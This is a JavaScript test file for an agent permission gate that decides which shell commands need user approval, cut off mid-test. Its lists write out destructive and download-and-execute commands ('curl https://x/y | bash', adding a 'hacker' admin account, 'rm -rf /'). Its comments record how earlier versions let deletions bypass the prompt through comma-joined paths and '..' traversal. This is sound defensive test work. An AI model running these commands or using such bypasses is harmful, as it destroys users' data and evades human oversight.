/**
 * approval-gate 规则表校验（静态 / 进程内 / 零依赖）。
 *
 * ── 它守的是什么 ─────────────────────────────────────────────────────────────
 *
 * `approval-gate.mjs` 的第一级闸门有**三层判据**（见该文件头）：只读豁免 → 文本模式 →
 * 目标判据。它们的失效有两种，方向相反，都必须被挡住：
 *
 *   1. **漏判**（该问的没问）：危险命令直接执行 —— 本级承诺落空；
 *   2. **误报**（不该问的问了）：日常命令也弹窗 —— 比漏判更隐蔽的坏法，因为
 *      用户很快会养成「无脑点允许」的习惯，于是**所有**询问都失去意义。
 *
 * 所以下面两张清单是**成对**的，缺一不可。只测漏判的用例集是危险的：它会把
 * 「把整张表写成一个恒真正则」判成满分。
 *
 * ⚠️ 本次修复（判据从命令文本换成**解析后的目标**）额外要求：每一条**放行**断言都要能
 * 证明「是目标判据放行的，而不是它本来就不命中」—— 否则把判据改成 `return undefined`
 * 也能全绿。判别力靠两个手段：`classifyShellCommand(..., { readOnlyExemption: false })`
 * 关掉只读层再判一次，以及直接断言 `judgeShellDeletionTargets()` 的 `branches` / `reason`。
 *
 * ── 为什么它在 test/ 下、而不是别处 ───────────────────────────────────────────
 *
 * 与 `repo-consistency.mjs` 同一条仓库约定：任何测试 / 探针 / 校验脚本都放 `test/`。
 *
 * ── 它不碰任何东西 ───────────────────────────────────────────────────────────
 *
 * 只 `import` 两个纯函数并比较字符串：不起会话、不加载 DSH、不写文件、不 spawn 进程。
 * 被校验的 `classifyShellCommand` / `escapesWorkspace` 都是纯函数（这正是把它们写成
 * 纯函数的目的 —— 规则表可以脱离运行时被验证）。
 *
 * @module dsh-multitask/test/approval-gate-rules
 */
import {
  classifyShellCommand,
  escapesWorkspace,
  classifyExecution,
  confinedToRoots,
  isUnderRoots,
  defaultTempRoots,
  resolvedTargetsOf,
  isReadOnlyCommand,
  isScratchArtifactName,
  isSensitiveBasename,
  resolveShellTargets,
  judgeShellDeletionTargets,
  targetDecisionLine,
  apply,
  DANGER_PATTERNS,
} from '../../presets/multitask/approval-gate.mjs'

const results = []

/**
 * 跑一条用例并记录（与同目录另两个脚本同形状）。
 *
 * @param name - 用例名。
 * @param fn - 断言体；抛错即算失败。
 */
function test(name, fn) {
  try {
    fn()
    results.push({ name, ok: true })
    console.log(`  PASS  ${name}`)
  } catch (error) {
    results.push({ name, ok: false, message: error.message })
    console.log(`  FAIL  ${name}\n        ${error.message}`)
  }
}

/** 最小断言（本仓库刻意不用 `node:assert`：少一处依赖）。 */
function assert(condition, message) {
  if (!condition) throw new Error(message)
}

/**
 * 跑一条**异步**用例并记录（与 `approval-gate-integration.mjs` 的 `testAsync` 同形状）。
 *
 * 为什么这里需要它：T20 要验证的是「`apply` 注册的 `tools/pre-execute` 真的把决定写进了
 * info 日志」—— 那个处理器是 `async` 的，同步 `test()` 拿不到结果。
 */
async function testAsync(name, fn) {
  try {
    await fn()
    results.push({ name, ok: true })
    console.log(`  PASS  ${name}`)
  } catch (error) {
    results.push({ name, ok: false, message: error.message })
    console.log(`  FAIL  ${name}\n        ${error.message}`)
  }
}

/**
 * 组装 `classifyExecution` 需要的选项（形状与 `apply` 里的那一处保持一致）。
 *
 * 工作目录固定为 `H:\proj`，与 G3–G5 里那些工作区判定的用例同一个值 —— 于是
 * 「workspace 内 / 外」的判定在整套用例里说的是同一个地方。
 *
 * @param tempRoots - 允许根（默认传 `defaultTempRoots()`）。
 * @returns 选项对象。
 */
function executionOptions(tempRoots) {
  return {
    shellTools: new Set(['pwsh', 'bash']),
    fileTools: new Set(['write', 'edit']),
    danger: DANGER_PATTERNS,
    safe: [],
    cwd: 'H:\\proj',
    caseInsensitive: true,
    tempRoots,
  }
}

/**
 * 组装 `judgeShellDeletionTargets` 需要的选项。
 *
 * @param tempRoots - 允许根。
 * @param shell - 解释器族（默认 `pwsh`）。
 * @returns 选项对象。
 */
function targetOptions(tempRoots, shell = 'pwsh') {
  return { cwd: 'H:\\proj', tempRoots, caseInsensitive: true, shell }
}

/**
 * 必须触发询问的命令。
 *
 * 选取依据是「**不可逆或越出工作区**」—— 这正是沙箱表达不了的那一类（工作区之内的
 * 破坏性删除、远端历史改写、发布外发、提权）。
 */
const MUST_ASK = [
  // 递归 / 强制删除（沙箱在工作区内是允许的 —— 本级的主要覆盖点）
  'rm -rf ./build',
  'rm -fr /tmp/x',
  'rm -r -f dist',
  'Remove-Item -Recurse -Force .\\dist',
  'del /s /q C:\\temp',
  'rd /s /q build',
  // 磁盘 / 引导 / 电源
  'format D:',
  'diskpart',
  'fdisk /dev/sda',
  'dd if=/dev/zero of=/dev/sda',
  'bcdedit /set x y',
  'shutdown /s /t 0',
  'Restart-Computer -Force',
  // 版本控制：丢工作 / 改远端历史
  'git push --force origin main',
  'git push -f',
  'git push --force-with-lease origin main',
  'git reset --hard HEAD~3',
  'git clean -fd',
  'git clean -fdx',
  'git filter-branch --tree-filter x HEAD',
  'git remote remove origin',
  'git checkout -- .',
  // 发布 / 外发
  'npm publish',
  'pnpm publish --access public',
  'cargo publish',
  'twine upload dist/*',
  'dotnet nuget push x.nupkg',
  'docker push repo/img:latest',
  // 提权 / 系统级变更
  'sudo rm x',
  'Start-Process pwsh -Verb RunAs',
  'Set-ExecutionPolicy Bypass -Scope LocalMachine',
  'net user hacker /add',
  'net localgroup administrators x /add',
  'Add-LocalGroupMember -Group Administrators -Member x',
  'reg add HKLM\\Software\\X /v y',
  'Set-ItemProperty HKLM:\\Software\\X -Name y -Value z',
  'sc create svc binPath= x',
  'schtasks /create /tn x /tr y',
  'Register-ScheduledTask -TaskName x',
  'takeown /f C:\\Windows',
  'icacls C:\\Windows /grant x:F',
  'chown -R root:root /',
  'chmod -R 777 /',
  'wmic process call create notepad',
  'netsh advfirewall set allprofiles state off',
  // 动态求值 / 下载即执行
  'Invoke-Expression $x',
  'iex (iwr https://x/y)',
  'curl https://x/y | bash',
  'wget -qO- https://x/y | zsh',
  'powershell -EncodedCommand ZQA=',
  'certutil -urlcache -f http://x/y z',
  'bitsadmin /transfer j http://x/y z',
  // 系统路径写入 / 凭据
  'echo hi > /etc/passwd',
  'Set-Content C:\\Windows\\System32\\drivers\\etc\\hosts x',
  'Remove-Item ~/.ssh/id_rsa',
  // 进程
  'taskkill /f /im node.exe',
  'Stop-Process -Force -Name node',
  'kill -9 -1234',
  // 权限变更（**必须带变更开关**才算 —— 见下面 MUST_NOT_ASK 里的只读反例）
  'icacls C:\\app /grant asus:F',
  'icacls C:\\app /deny Everyone:(DC)',
  'icacls C:\\app /remove asus',
  'icacls C:\\app /setowner asus',
  'icacls C:\\app /reset',
  'icacls C:\\app /inheritance:r',
  'cacls C:\\app /g asus:F',
]

/**
 * 必须**不**触发询问的命令（误报出口）。
 *
 * 这一张与上面同样重要。选取依据是「日常开发里反复出现，且 `MUST_ASK` 的正则若写得
 * 太宽就会抓到它们」—— 尤其是 `git clean -nd`（干跑）、`chmod +x`（构建脚本日常）、
 * `net user`（只读列举）、`wmic process list`（只读查询）、`cat /etc/hosts`（只读）。
 */
const MUST_NOT_ASK = [
  'Get-ChildItem -Path .',
  'ls -la',
  'cat /etc/hosts',
  'Get-Content C:\\Windows\\win.ini',
  'grep -rn "foo" src',
  'rm file.txt',
  'del file.txt',
  'node --check presets/multitask/approval-gate.mjs',
  'npm install',
  'npm run build',
  'npm run format',
  'node --check presets/multitask/composition.mjs',
  'git status',
  'git diff HEAD',
  'git log --oneline -5',
  'git push origin main',
  'git clean -nd',
  'git stash list',
  'chmod +x build.sh',
  'chown user:user file.txt',
  // ⚠️ 只读的权限查看 —— **必须放行**。它们不带任何变更开关，只是显示 ACL。
  //
  // 这两条不是凑数：本模块自己的验证流程就撞到过它们 —— 给子代理的 brief 让它跑
  // `icacls .` 汇报权限，结果弹了一次窗，用户不得不为一个纯粹只读的命令点「允许」。
  // 那次误报比漏判更糟：它训练用户对弹窗麻木。
  'icacls .',
  'icacls C:\\app',
  'icacls "H:\\test3"',
  'cacls C:\\app',
  'Get-Acl -LiteralPath C:\\app',
  'net user',
  'wmic process list',
  'netsh advfirewall show allprofiles',
  'echo hello',
  'python -m pytest',
  'dotnet build',
  'cargo build --release',
  'docker build -t x .',
  'pwsh -NoProfile -c "Get-Date"',
  'Set-Location H:\\work',
  'New-Item -ItemType Directory -Path build',
  'Stop-Process -Name notepad',
  // ── 只读审计（本次修复的降噪目标）─────────────────────────────────────────
  // 日志审计里**提到**危险词不是危险动作：命中的是词，不是动作。文本判据必然抓到它们，
  // 所以这一档必须由**只读豁免**（第一层）挡住 —— 而非靠把正则写窄（写不窄：词是同一个词）。
  "Get-Content .\\app.log | Select-String -Pattern 'shutdown|reboot|halt'",
  'Get-Content .\\shutdown.log',
  'Get-ChildItem . | Select-Object -Property Name',
  'Get-ChildItem . -Recurse -File | Get-FileHash',
]

console.log('===== dsh-multitask approval-gate 规则表校验（静态 / 进程内）=====')

console.log('\n--- 1. 漏判（该问的没问）---')
test('G1 危险命令全部命中规则表', () => {
  const misses = MUST_ASK.filter((command) => classifyShellCommand(command) === undefined)
  assert(
    misses.length === 0,
    `${misses.length} / ${MUST_ASK.length} 条危险命令**没有**命中任何规则，会被直接执行：\n        - ${misses.join('\n        - ')}`,
  )
})

console.log('\n--- 2. 误报（不该问的问了）---')
test('G2 日常命令一个都不命中（否则用户会养成无脑点允许的习惯）', () => {
  const falsePositives = MUST_NOT_ASK.map((command) => [command, classifyShellCommand(command)]).filter(
    ([, hit]) => hit !== undefined,
  )
  assert(
    falsePositives.length === 0,
    `${falsePositives.length} / ${MUST_NOT_ASK.length} 条日常命令被误判为危险：\n` +
      falsePositives.map(([command, hit]) => `        - ${command}  -> ${hit}`).join('\n'),
  )
})

console.log('\n--- 3. 工作区逃逸判定 ---')
test('G3 工作区内的相对路径不算逃逸', () => {
  assert(escapesWorkspace('src/app.js', 'H:\\proj', true) === false, '工作区内的相对路径被判成了逃逸')
  assert(escapesWorkspace('a/../b.js', 'H:\\proj', true) === false, '路径中间的 `..` 不该算逃逸（没有真的往外走）')
  assert(escapesWorkspace('H:\\proj\\src\\a.js', 'H:\\proj', true) === false, '工作区内的绝对路径被判成了逃逸')
})

test('G4 前导上溯与工作区外路径算逃逸', () => {
  assert(escapesWorkspace('..\\..\\etc\\passwd', 'H:\\proj', true) === true, '前导 `..` 逃逸未被识别')
  assert(escapesWorkspace('../sibling/x', 'H:\\proj', true) === true, '前导 `../` 逃逸未被识别')
  assert(escapesWorkspace('H:\\other\\a.js', 'H:\\proj', true) === true, '工作区外的绝对路径未被识别')
  assert(escapesWorkspace('C:\\Windows\\x', 'H:\\proj', true) === true, '系统盘路径未被识别')
})

test('G5 工作区前缀判定：相似前缀不能误判为「在工作区内」', () => {
  // `H:\project-x` 以 `H:\proj` 开头，但**不是**它的子目录 —— 前缀比较必须按路径段。
  assert(
    escapesWorkspace('H:\\project-x\\a.js', 'H:\\proj', true) === true,
    '`H:\\project-x` 被判成了 `H:\\proj` 的子目录（前缀比较没有按路径段对齐）',
  )
  assert(escapesWorkspace('H:\\proj\\a.js', 'H:\\proj\\', true) === false, '工作区根自身带尾斜杠时判定出错')
})

test('G5b 家目录简写 `~` 必须按绝对路径处理（否则是一个真实的漏判）', () => {
  // `~/.ssh/id_rsa` 不在工作区里。若把 `~` 当成普通相对路径，它就会被判成「工作区内」
  // 而放行 —— 那是把手伸进用户的家目录写东西，必须拦。
  assert(escapesWorkspace('~/.ssh/id_rsa', 'H:\\proj', true) === true, '`~/.ssh/id_rsa` 未被识别为工作区之外')
  assert(escapesWorkspace('~', 'H:\\proj', true) === true, '裸 `~` 未被识别为工作区之外')
  assert(escapesWorkspace('~\\.ssh\\id_rsa', 'H:\\proj', true) === true, '反斜杠写法的 `~` 未被识别')
})

test('G6 空路径与畸形输入不抛错（调用点依赖这条）', () => {
  assert(classifyShellCommand('') === undefined, '空命令应当放行')
  assert(classifyShellCommand(undefined) === undefined, 'undefined 命令应当放行')
  assert(classifyShellCommand(12345) === undefined, '非字符串命令应当放行')
  assert(escapesWorkspace('', 'H:\\proj', true) === false, '空路径不该算逃逸')
  assert(escapesWorkspace(undefined, 'H:\\proj', true) === false, 'undefined 路径不该算逃逸')
})

console.log('\n--- 4. 大小写不敏感（win32 上的实际形态）---')
test('G7 大写写法同样命中', () => {
  assert(classifyShellCommand('RM -RF ./build') !== undefined, '全大写 `RM -RF` 未命中')
  assert(classifyShellCommand('GIT PUSH --FORCE') !== undefined, '全大写 `GIT PUSH --FORCE` 未命中')
  assert(classifyShellCommand('Remove-Item -Recurse -Force x') !== undefined, '混合大小写的 Remove-Item 未命中')
})

console.log('\n--- 5. 临时目录豁免：草稿行为不打扰用户，危险行为照问 ---')
test('T1 只删临时目录内的东西 ⇒ 放行', () => {
  const roots = defaultTempRoots()
  assert(roots.length > 0, '应当至少有平台临时根；推导失败会让整档豁免失效')
  assert(confinedToRoots('rm -rf /tmp/x', roots, true) === true, '只删 /tmp/x 应当放行')
})

test('T2 ★ 删除命令里混了任意一个非临时路径 ⇒ 照问（豁免不许被借道）', () => {
  const roots = defaultTempRoots()
  // 这一条是整档豁免的**安全边界**：命令里只要有一项落在允许根之外，就不能放行。
  assert(confinedToRoots('rm -rf /tmp/x /home/u', roots, true) === false, '混入 /home/u 却仍被判为「仅临时目录」')
  assert(confinedToRoots('rm -rf C:\\Windows', roots, true) === false, '系统目录不该被豁免')
  assert(confinedToRoots('Remove-Item -Recurse C:\\Windows', roots, true) === false, 'PowerShell 递归删系统目录不该被豁免')
})

test('T3 ★ 含 shell 元字符 ⇒ 一律不豁免（宁可多问一次）', () => {
  const roots = defaultTempRoots()
  const commands = [
    'rm -rf $env:TEMP\\x',
    'rm -rf `echo /tmp`',
    'rm -rf /tmp/a && rm -rf /',
    'rm -rf /tmp/x > /dev/null',
    // 实测（1.2.10，自检 E2）原样命令：延迟确认 + 两条 `$` 变量展开的收尾语句。
    // 判据只要求它**判否**（来源里含 `$` 与 `;`），是否弹卡由门控决定 —— 两件事分开测。
    'Remove-Item -LiteralPath "$env:TEMP\\dsh-mt-selftest" -Recurse -Force -ErrorAction Continue; "EXITCODE=$LASTEXITCODE"; "STILL_EXISTS=" + (Test-Path "$env:TEMP\\dsh-mt-selftest")',
  ]
  for (const command of commands) {
    assert(
      confinedToRoots(command, roots, true) === false,
      `含元字符的命令被判为可豁免：${command} —— 一次误判就会放过整行危险命令`,
    )
  }
})

test('T4 往临时目录写 ⇒ 放行；往工作区外别处写 ⇒ 照问', () => {
  const caseInsensitive = true
  // 临时根随机器而变（win32 上是 %TEMP%，里面含用户名）：改成从 defaultTempRoots() 取，
  // 这条断言验的是「落在默认临时根下的写入被放行」，与用户名无关。
  const roots = defaultTempRoots()
  assert(roots.length > 0, '应当至少推导出一个临时根 —— 否则这条放行断言等于没测')
  const base = {
    shellTools: new Set(['pwsh']),
    fileTools: new Set(['write']),
    danger: DANGER_PATTERNS,
    safe: [],
    cwd: 'H:\\proj',
    caseInsensitive,
    tempRoots: roots,
  }
  const inTemp = classifyExecution(
    { name: 'write', arguments: { file_path: `${roots[0]}/dsh-x/a.txt` } },
    base,
  )
  assert(inTemp === undefined, '往系统临时目录写应当放行（DSH 自己就在那里建目录）')
  const elsewhere = classifyExecution({ name: 'write', arguments: { file_path: 'C:\\Windows\\x.dll' } }, base)
  assert(elsewhere !== undefined, '往系统目录写必须照问')
})

test('T5 ★ 临时根为空（用户关掉这一档）时，删除命令一律照问', () => {
  const base = {
    shellTools: new Set(['pwsh']),
    fileTools: new Set(['write']),
    danger: DANGER_PATTERNS,
    safe: [],
    cwd: 'H:\\proj',
    caseInsensitive: true,
    tempRoots: [],
  }
  const hit = classifyExecution({ name: 'pwsh', arguments: { command: 'rm -rf /tmp/x' } }, base)
  assert(hit !== undefined, '关掉豁免后，删临时目录也应当照问 —— 否则「关闭」是个假开关')
})

test('T6 相似前缀不算「在临时目录里」（H:\\Temp-x 与 H:\\Temp）', () => {
  assert(isUnderRoots('H:/Temp-x/a', ['H:/Temp'], true) === false, '相似前缀被误判为在根下')
  assert(isUnderRoots('H:/Temp/a', ['H:/Temp'], true) === true, '真正的子路径未被识别')
  assert(isUnderRoots('H:/Temp', ['H:/Temp'], true) === true, '根本身应当算在根下')
})

test('T7 ★ 逗号粘连的多路径删除 ⇒ 照问（1.2.10 实测 E3 就是这么借道的）', () => {
  // 结症：`"A","B"` 两个路径之间**没有空格**，按空白分词只能切出一个令牌，
  // 而那个令牌以临时根开头 —— 纯词法前缀比较必然判「在根下」，整条命令被豁免。
  // 实测（1.2.10，E3）：`Remove-Item -LiteralPath "<temp>\dsh-mt-e3-r1","C:\nonexistent" -Recurse -Force`
  // 没有弹卡、直接执行，临时目录被真的删掉。
  const roots = defaultTempRoots()
  const commaGlued = [
    'rm -rf /tmp/a,/home/u',
    'Remove-Item -LiteralPath "/tmp/a","C:\\Windows" -Recurse -Force',
    'Remove-Item -LiteralPath "/tmp/a","/home/u" -Recurse -Force',
  ]
  for (const command of commaGlued) {
    assert(
      confinedToRoots(command, roots, true) === false,
      `逗号粘连的多路径命令被判为可豁免：${command} —— 豁免不许被这一种写法整条借道`,
    )
  }
  // 换行是同一类「粘连」：豁免只对**单条**命令有意义，而换行后面可以另起一条。
  const multiline = 'rm -rf /tmp/a\nrm -rf /'
  assert(confinedToRoots(multiline, roots, true) === false, '换行后的第二条命令让整段豁免成立')
})

test('T8 ★ 路径里的 `..` 段 ⇒ 照问（词法前缀比较挡不住它）', () => {
  // 结症：`/tmp/../../../etc/passwd` 字面上以 `/tmp` 开头，前缀比较必然成立，
  // 但它真正指向的是根外。1.2.10 上 `rm -rf <temp>/../../../Windows` 与
  // `write` 到 `<temp>/../../../Windows/System32/x.dll` 都是靠这一手静默放行的。
  const roots = defaultTempRoots()
  const traversals = [
    'rm -rf /tmp/../../../etc',
    'rm -rf /tmp/a/../..',
    'Remove-Item -LiteralPath "/tmp/..\\..\\Windows" -Recurse -Force',
  ]
  for (const command of traversals) {
    assert(
      confinedToRoots(command, roots, true) === false,
      `含上溯段的删除命令被判为可豁免：${command}`,
    )
  }
  assert(isUnderRoots('/tmp/../../../etc/passwd', ['/tmp'], true) === false, '`..` 段被前缀比较放过')

  // 写入豁免走的是同一个判据，所以它也必须一起挡住。
  const base = {
    shellTools: new Set(['pwsh']),
    fileTools: new Set(['write']),
    danger: DANGER_PATTERNS,
    safe: [],
    cwd: '/workspace',
    caseInsensitive: true,
    tempRoots: roots,
  }
  const written = classifyExecution({ name: 'write', arguments: { file_path: '/tmp/../../../etc/cron.d/x', content: 'x' } }, base)
  assert(written !== undefined, '经 `..` 上溯的写入被当成「在临时目录里」而放行')
})

test('T9 ★ 相对路径参数 ⇒ 照问；纯枚举选项值仍然放行', () => {
  // 文件头第 4 条（「相对路径参数也算数」）在 1.2.10 里只是一句注释：实现把
  // 「既非绝对路径、又不含 `/`」的令牌一律跳过，于是 `rm -rf <temp>/a ..`（删父目录）、
  // `rm -rf <temp>/a *`（删当前目录全部）都整条借道。
  const roots = defaultTempRoots()
  for (const command of ['rm -rf /tmp/a ..', 'rm -rf /tmp/a *', 'rm -rf /tmp/a dist', 'rm -rf /tmp/a ./dist']) {
    assert(confinedToRoots(command, roots, true) === false, `含相对路径参数却仍被豁免：${command}`)
  }
  // 反向的一半：真实用法不能被这条新判据误伤，否则用户又会开始闭眼点允许。
  assert(
    confinedToRoots('Remove-Item -LiteralPath /tmp/a -Recurse -Force -ErrorAction Continue', roots, true) === true,
    '`-ErrorAction Continue` 被当成相对路径，日常清理临时目录也要弹卡',
  )
  assert(confinedToRoots('rm -rf /tmp/a /tmp/b', roots, true) === true, '两个临时目录路径应当放行')
  assert(
    confinedToRoots('Remove-Item -LiteralPath "/tmp/a" -Recurse -Force', roots, true) === true,
    '带引号的单个临时目录路径应当放行',
  )
})

test('T10 ★ 引号内的数据字面量不算管道/动态求值；真管道仍然照问', () => {
  // 实测误报：`Select-String -Pattern 'log|sh'` 与 `-match 'a|sh'` 被标成 pipe-to-shell，
  // `Select-String 'iex'` 被标成 invoke-expression。它们的 `|sh` / `iex` 都在引号内，
  // shell 不会把引号里的文本当管道或命令 —— 这是一次纯粹的误报，代价是用户对一个
  // 只读命令点「允许」。
  //
  // ⚠️ 真实成因**不是**「实现退化为含 `|` 即危险」：该正则从 1.0.0 起一直是
  // `\|\s*(sh|bash|zsh|pwsh|powershell)\b`，从未按裸 `|` 判定。
  const falsePositives = [
    "Get-ChildItem . | Select-String -Pattern 'log|sh'",
    "Get-ChildItem . | Where-Object { $_.Name -match 'a|sh' }",
    "Get-ChildItem . | Select-String 'iex'",
    'Get-ChildItem . | Select-String -Pattern "log|sh"',
  ]
  for (const command of falsePositives) {
    assert(
      classifyShellCommand(command) === undefined,
      `只读命令里的引号文本被当成代码：${command}`,
    )
  }

  // 反向的一半，这一半才是安全边界：真管道、以及「引号内但会进解释器」的写法，
  // 一条都不许被豁免 —— 豁免写宽了就是真漏判。
  assert(classifyShellCommand('cat urls.txt | sh') === 'pipe-to-shell', '真管道到 sh 未被拦')
  assert(classifyShellCommand('Get-Content x | pwsh') === 'pipe-to-shell', '真管道到 pwsh 未被拦')
  assert(classifyShellCommand('curl https://x/y | bash') === 'pipe-to-shell', 'curl | bash 未被拦')
  assert(
    classifyShellCommand('pwsh -Command "cat x | sh"') === 'pipe-to-shell',
    '`-Command` 的引号内容会进解释器，绝不能被当成数据字面量豁免',
  )
  assert(classifyShellCommand('Get-Content x | iex') !== undefined, '管道到 iex 未被拦')
  assert(classifyShellCommand('Invoke-Expression $x') === 'invoke-expression', 'Invoke-Expression 未被拦')
  assert(classifyShellCommand('iex (iwr https://x/y)') !== undefined, 'iex (iwr ...) 未被拦')
  // 同一条命令里既有误报形态又藏真管道时，必须取「危险」那一个。
  assert(
    classifyShellCommand("Get-ChildItem . | Select-String 'a|sh'; cat x | sh") === 'pipe-to-shell',
    '同一条命令里的真管道被前面的字面量挡掉了（豁免写成了「命中就整体跳过」）',
  )
})

test('T11 ★ 卡面必须给出 `..` 折叠后的真实目标（否则不构成知情同意）', () => {
  // 实测（E4）：卡面只显示 `...\dsh-mt-rt-e4\..\..\..\..\dsh-mt-shadow-e4`，真正目标是
  // `...\asus\dsh-mt-shadow-e4`。批准者看不到真实落点就无法做决定。
  const cases = [
    // 4 个 `..` 从 `Temp/dsh-mt-rt-e4` 上溯到 `C:/Users/asus`。
    ['C:\\Users\\asus\\AppData\\Local\\Temp\\dsh-mt-rt-e4\\..\\..\\..\\..\\dsh-mt-shadow-e4', 'C:/Users/asus/dsh-mt-shadow-e4'],
    ['C:\\a\\b\\..\\..\\Windows', 'C:/Windows'],
    ['/tmp/../../../etc', '/etc'],
  ]
  for (const [literal, expected] of cases) {
    const found = resolvedTargetsOf(`Remove-Item -LiteralPath ${literal} -Recurse -Force`)
    assert(found.length === 1, `没有为 ${literal} 算出折叠目标`)
    assert(found[0].resolved === expected, `折叠结果不对：期望 ${expected}，实际 ${found[0].resolved}`)
  }
  // 不含 `..` 的路径**不**补这一行，否则卡面上每个正常路径都会多一句，反而更难读。
  assert(
    resolvedTargetsOf('Remove-Item -LiteralPath C:\\Users\\asus\\AppData\\Local\\Temp\\x -Recurse -Force').length === 0,
    '正常路径也被标成了「折叠后不同」',
  )
  // 不能把盘符根弹掉：`C:\..` 仍然是 `C:\`。
  const rootClamp = resolvedTargetsOf('Remove-Item -Recurse -Force C:\\..\\Windows')
  assert(rootClamp.length === 1 && rootClamp[0].resolved === 'C:/Windows', '`C:\\..` 把盘符根弹掉了')
})

// ── 6. 第一层：只读豁免 ──────────────────────────────────────────────────────
console.log('\n--- 6. 只读豁免：整条命令不改任何东西 ⇒ 永不判危险 ---')

test('T12 只读判据：每段的命令名都必须在登记表里，且引号外不许有可执行结构', () => {
  // 正向：日常读取 / 审计类。它们一个字节都不改。
  const readOnly = [
    'Get-Content app.log',
    'Get-ChildItem . | Select-Object -First 5',
    'Get-ChildItem . -Recurse -File | Get-FileHash',
    "Select-String -Path app.log -Pattern 'shutdown|reboot|halt'",
    'grep -rn "foo" src',
    'cat /etc/hosts',
    'Test-Path H:\\proj\\x',
    'Where-Object Name -eq "x"',
  ]
  for (const command of readOnly) {
    assert(isReadOnlyCommand(command) === true, `纯只读命令被判成会改东西：${command}`)
  }

  // 反向：这一半才是安全边界 —— 每一行都能在「看起来只读」的外壳里藏一个真实的变更动作。
  const notReadOnly = [
    'Remove-Item -Force x',
    'Get-Content x; Remove-Item -Force y',
    'Get-Content x | Set-Content y',
    'Get-Content x | Out-File y',
    // 脚本块**会执行**：命令名是只读的，块里不是。
    'Get-ChildItem . | Where-Object { Remove-Item $_.FullName }',
    // 圆括号里的子表达式**也会执行**。
    'Get-Content (Remove-Item -Force C:\\Windows\\x)',
    // 重定向 / 串联 / 命令替换
    'echo hi > /etc/passwd',
    'Get-Content x 2>&1',
    "Get-ChildItem . | Select-String 'a|sh'; cat x | sh",
    'Invoke-Expression (Get-Content x)',
    // 认不出的命令名一律不是只读（fail-closed）
    'python -m pytest',
    'node --check presets/multitask/approval-gate.mjs',
  ]
  for (const command of notReadOnly) {
    assert(isReadOnlyCommand(command) === false, `会改东西（或不可判定）的命令被判成只读：${command}`)
  }

  // ⚠️ `git` 是**故意**不在只读登记表里的：`git -c core.pager=…` / `core.fsmonitor=…` 能借
  // 配置执行任意命令，`git --output=<file>` 会写文件。要在词法上把它们排除干净，就得再做
  // 一层与被替换掉的文本判据同形的猜测 —— 那正是本次要去掉的东西。代价只是「git 审计里
  // 提到 shutdown 时照问一次」，方向安全。
  assert(isReadOnlyCommand('git status') === false, 'git 不得进入只读登记表（`-c` / `--output` 都能落地副作用）')

  // ⚠️ 前缀白名单必须窄到**不可能包含写动词**。这一条来自一次真实的漏判：`format-` 一度在
  // 前缀里，于是 `Format-Volume`（格式化卷）被判成只读，内置危险模式随即被 `continue` 掉。
  // `measure-` 同理：`Measure-Command` 会**执行**它的参数。所以这两个动词只收具体名字。
  for (const command of ['Format-Volume -DriveLetter D', 'Measure-Command -Expression x']) {
    assert(isReadOnlyCommand(command) === false, `写动词被前缀白名单吃掉了：${command}`)
  }
  // 端到端的那一半：把「执行型」命令放进只读外壳里也必须照问 —— 一旦有人把 `measure-`
  // 放回前缀，这条会立刻变红（它命中的是内置的 `power-state`）。
  assert(
    classifyExecution(
      { name: 'pwsh', arguments: { command: 'Measure-Command -Expression "shutdown"' } },
      executionOptions(defaultTempRoots()),
    ) !== undefined,
    '`Measure-Command -Expression "shutdown"` 被判成只读而放行 —— 只读豁免在掩盖一个真实命中',
  )
  // 反向的一半：真正的只读 `Format-*` / `Measure-*` 必须**逐名收录**，否则「不按前缀放行」
  // 会退化成全部误拦（那正是另一半要避免的坏法）。
  for (const command of ['Format-Table', 'Format-List', 'Format-Wide', 'Measure-Object -Property Length']) {
    assert(isReadOnlyCommand(command) === true, `只读的 ${command} 没被收录`)
  }
})

test('T13 ★ 纯只读审计命令永不判危险（实测被误判成 power-state 的那一类）', () => {
  // 实测形态：日志审计里**提到** `shutdown` / `Remove-Item -Recurse -Force`，文本判据必然
  // 命中，而那类命令一个字节都没改。判据必须能分开「词出现了」与「动作会发生」。
  const confusable = [
    "Get-Content .\\access.log | Select-String -Pattern 'shutdown'",
    "Select-String -Path access.log -Pattern 'shutdown|Restart-Computer|halt'",
    "Get-Content .\\app.log | Select-String 'Remove-Item -Recurse -Force' -SimpleMatch",
    'Get-Content .\\shutdown.log',
  ]
  for (const command of confusable) {
    assert(classifyShellCommand(command) === undefined, `只读审计被当成危险操作：${command}`)
    // 判别力：关掉只读豁免后**必须**命中 —— 否则这组断言是恒真的，
    // 换成一个「永远返回 undefined」的实现也全绿。
    const textual = classifyShellCommand(command, DANGER_PATTERNS, [], { readOnlyExemption: false })
    assert(textual !== undefined, `关掉只读豁免后「${command}」仍然不命中 —— 这条断言没有判别力`)
  }

  // 另一半：本来就不命中任何模式的纯只读命令也不许被新判据弄红。
  for (const command of ['Get-ChildItem . | Select-Object -Property Name', 'Get-FileHash .\\dist\\app.tgz']) {
    assert(classifyShellCommand(command) === undefined, `纯只读命令被误判：${command}`)
    assert(isReadOnlyCommand(command) === true, `应当被判为只读：${command}`)
  }
})

// ── 7. 第三层的输入：目标解析 ───────────────────────────────────────────────
console.log('\n--- 7. 目标解析：解析不出来的必须判否（fail-closed）---')

test('T14 解析：`$env:NAME` / 相对路径 / `~` 能解析；七类失败各有 reason', () => {
  const roots = defaultTempRoots()
  const probeName = 'DSH_MULTITASK_TARGET_PROBE'
  const base = { cwd: 'H:\\proj', shell: 'pwsh' }

  // ① 环境变量：用一个**自建**变量，避免依赖某个平台恰好设了哪个（TEMP / TMPDIR 因机器而异）。
  process.env[probeName] = roots[0]
  try {
    const resolved = resolveShellTargets(`Remove-Item -Force $env:${probeName}\\dsh-x`, base)
    assert(resolved.ok === true, `$env:${probeName} 没能解析出来：${resolved.reason}`)
    assert(resolved.targets.length === 1, `目标数量不对：${JSON.stringify(resolved.targets)}`)
    assert(
      isUnderRoots(resolved.targets[0], [roots[0]], true) === true,
      `解析结果不在临时根下：${resolved.targets[0]}`,
    )
  } finally {
    delete process.env[probeName]
  }

  // ② 相对路径按 `cwd` 展开（`Remove-Item -Force .tmp-x` 是本次要放行的形态之一）。
  const relative = resolveShellTargets('Remove-Item -Force .tmp-x', base)
  assert(relative.ok === true, `相对路径没能解析：${relative.reason}`)
  assert(relative.targets[0] === 'H:/proj/.tmp-x', `相对路径没按 cwd 展开：${JSON.stringify(relative.targets)}`)

  // ③ 家目录简写。
  const home = resolveShellTargets('Remove-Item -Force ~/.cache/x', base)
  assert(home.ok === true, '`~` 没能解析成绝对路径')
